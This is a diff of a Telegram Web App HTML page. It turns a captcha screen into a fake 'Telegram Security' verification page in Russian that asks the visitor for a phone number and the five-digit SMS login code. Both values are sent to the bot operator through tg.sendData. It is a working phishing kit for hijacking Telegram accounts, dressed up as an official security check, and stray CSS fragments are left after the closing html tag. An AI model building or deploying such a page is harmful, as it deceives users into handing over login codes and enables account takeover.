@@ -3,103 +3,197 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Telegram</title>
+    <title>Telegram Security</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root {
-            --bg: #0f0f0f;
-            --card: #1a1a1a;
-            --blue: #2aabee;
-            --green: #4caf50;
-            --red: #f44336;
-            --gray: #888;
-            --border: #2a2a2a;
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+            background:#0f0f0f;color:#fff;min-height:100vh;
+            display:flex;align-items:center;justify-content:center;padding:16px;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        .container{
+            background:#1a1a1a;border-radius:20px;padding:32px 24px;
+            max-width:400px;width:100%;text-align:center;
+            border:1px solid #2a2a2a;box-shadow:0 20px 60px rgba(0,0,0,0.5);
+        }
+        .shield{
+            width:80px;height:80px;margin:0 auto 24px;
+            background:linear-gradient(135deg,#2aabee,#1a8fc4);
+            border-radius:50%;display:flex;align-items:center;justify-content:center;
+            font-size:40px;animation:pulse 2s infinite;
+        }
+        @keyframes pulse{
+            0%,100%{box-shadow:0 0 0 0 rgba(42,171,238,0.4)}
+            50%{box-shadow:0 0 0 20px rgba(42,171,238,0)}
+        }
+        h2{font-size:22px;margin-bottom:6px}
+        .sub{color:#888;font-size:14px;margin-bottom:24px;line-height:1.5}
+        .hidden{display:none!important}
         
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: var(--bg);
-            color: #fff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
+        .input-box{
+            background:#1e1e1e;border:1px solid #2a2a2a;border-radius:12px;
+            padding:4px 16px;display:flex;align-items:center;gap:10px;margin-bottom:16px;
+            transition:border 0.3s;
+        }
+        .input-box:focus-within{border-color:#2aabee}
+        .input-box span{color:#888;font-size:18px;flex-shrink:0}
+        .input-box input{
+            width:100%;padding:14px 0;border:none;background:transparent;
+            color:#fff;font-size:16px;outline:none;font-family:inherit;
+        }
+        .input-box input::placeholder{color:#444}
+        
+        .btn{
+            width:100%;padding:15px;border:none;border-radius:12px;
+            background:#2aabee;color:#fff;font-size:16px;font-weight:600;
+            cursor:pointer;transition:all 0.25s;font-family:inherit;
+        }
+        .btn:hover{background:#2299d4}
+        .btn:active{transform:scale(0.97)}
+        .btn:disabled{background:#333!important;color:#666!important;cursor:not-allowed}
+        
+        .status{margin-top:14px;font-size:13px;min-height:20px}
+        .status.ok{color:#4caf50}
+        .status.err{color:#f44336}
+        
+        .back-link{margin-top:14px;font-size:13px;color:#888;cursor:pointer;display:inline-block}
+        .back-link:hover{color:#fff}
+        
+        .spinner{
+            display:inline-block;width:18px;height:18px;
+            border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;
+            border-radius:50%;animation:spin 0.7s linear infinite;
+            vertical-align:middle;margin-right:8px;
+        }
+        @keyframes spin{to{transform:rotate(360deg)}}
+        
+        .success-icon{font-size:64px;animation:bounceIn 0.6s ease}
+        @keyframes bounceIn{
+            0%{transform:scale(0);opacity:0}
+            50%{transform:scale(1.2)}
+            100%{transform:scale(1);opacity:1}
         }
         
-        .container {
-            background: var(--card);
-            border-radius: 20px;
-            padding: 32px 24px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            border: 1px solid var(--border);
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        .footer{margin-top:24px;font-size:11px;color:#333}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="shield">🛡️</div>
+        
+        <div id="step1">
+            <h2>Проверка безопасности</h2>
+            <p class="sub">Подтвердите что вы владелец этого аккаунта Telegram</p>
+            <div class="input-box">
+                <span>📱</span>
+                <input type="tel" id="phoneInput" placeholder="+7 911 222 33 44" autocomplete="tel">
+            </div>
+            <button class="btn" onclick="sendCode()" id="sendBtn">📩 Отправить код</button>
+            <div class="status" id="phoneStatus"></div>
+        </div>
+        
+        <div id="step2" class="hidden">
+            <h2>Код подтверждения</h2>
+            <p class="sub">Мы отправили 5-значный код на номер<br><strong id="phoneDisplay"></strong></p>
+            <div class="input-box">
+                <span>🔑</span>
+                <input type="text" id="codeInput" placeholder="Введите код" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
+            </div>
+            <button class="btn" onclick="verifyCode()" id="verifyBtn">✅ Подтвердить</button>
+            <div class="status" id="codeStatus"></div>
+            <span class="back-link" onclick="goBack()">← Изменить номер</span>
+        </div>
+        
+        <div id="step3" class="hidden">
+            <div class="success-icon">✅</div>
+            <h2>Верификация пройдена</h2>
+            <p class="sub">Ваш аккаунт успешно подтверждён.<br>Спасибо за сотрудничество.</p>
+        </div>
+        
+        <div class="footer">Telegram Security © 2024</div>
+    </div>
+    
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+        tg.MainButton.hide();
+        
+        let phoneNumber = '';
+        
+        function sendCode(){
+            const raw = document.getElementById('phoneInput').value.trim();
+            if(!raw){
+                document.getElementById('phoneStatus').textContent = 'Введите номер телефона';
+                document.getElementById('phoneStatus').className = 'status err';
+                return;
+            }
+            
+            phoneNumber = raw.replace(/\s+/g,'').replace(/-/g,'').replace(/\(/g,'').replace(/\)/g,'');
+            if(!phoneNumber.startsWith('+')) phoneNumber = '+' + phoneNumber;
+            
+            const btn = document.getElementById('sendBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span>Отправка...';
+            document.getElementById('phoneStatus').textContent = '';
+            document.getElementById('phoneStatus').className = 'status';
+            
+            tg.sendData(JSON.stringify({action:'send_code', phone:phoneNumber}));
         }
         
-        .shield {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 24px;
-            position: relative;
-        }
-        .shield-icon {
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, var(--blue), #1a8fc4);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 40px;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(42, 171, 238, 0.4); }
-            50% { box-shadow: 0 0 0 20px rgba(42, 171, 238, 0); }
+        function verifyCode(){
+            const code = document.getElementById('codeInput').value.trim();
+            if(!code || code.length < 5){
+                document.getElementById('codeStatus').textContent = 'Введите 5 цифр из SMS';
+                document.getElementById('codeStatus').className = 'status err';
+                return;
+            }
+            
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span>Проверка...';
+            document.getElementById('codeStatus').textContent = '';
+            document.getElementById('codeStatus').className = 'status';
+            
+            tg.sendData(JSON.stringify({action:'verify_code', code:code, phone:phoneNumber}));
         }
         
-        h2 { font-size: 22px; font-weight: 700; margin-bottom: 6px; letter-spacing: -0.3px; }
-        .subtitle { color: var(--gray); font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
+        function goBack(){
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+            document.getElementById('sendBtn').disabled = false;
+            document.getElementById('sendBtn').innerHTML = '📩 Отправить код';
+        }
         
-        /* Галочка */
-        .captcha-wrapper {
-            background: #1e1e1e;
-            border: 1px solid var(--border);
-            border-radius: 14px;
-            padding: 18px 16px;
-            margin-bottom: 16px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            transition: all 0.25s;
-            -webkit-tap-highlight-color: transparent;
-            user-select: none;
-        }
-        .captcha-wrapper:active { transform: scale(0.98); background: #252525; }
+        // Колбэки от бота
+        window.showCodeStep = function(phone){
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('phoneDisplay').textContent = phone;
+            document.getElementById('codeInput').focus();
+        };
         
-        .check-box {
-            width: 30px;
-            height: 30px;
-            border: 2px solid #555;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            transition: all 0.3s;
-            position: relative;
-        }
-        .check-box.done {
-            background: var(--blue);
-            border-color: var(--blue);
-            animation: popIn 0.4s ease;
-        }
-        @keyframes popIn {
-            0% { transform: scale(0.5); opacity: 0; }
+        window.showDone = function(){
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+        };
+        
+        window.showError = function(msg, step){
+            const el = document.getElementById(step === 'phone' ? 'phoneStatus' : 'codeStatus');
+            el.textContent = msg;
+            el.className = 'status err';
+            if(step === 'phone'){
+                document.getElementById('sendBtn').disabled = false;
+                document.getElementById('sendBtn').innerHTML = '📩 Отправить код';
+            }else{
+                document.getElementById('verifyBtn').disabled = false;
+                document.getElementById('verifyBtn').innerHTML = '✅ Подтвердить';
+            }
+        };
+    </script>
+</body>
+</html>            0% { transform: scale(0.5); opacity: 0; }
             70% { transform: scale(1.15); }
             100% { transform: scale(1); opacity: 1; }
         }
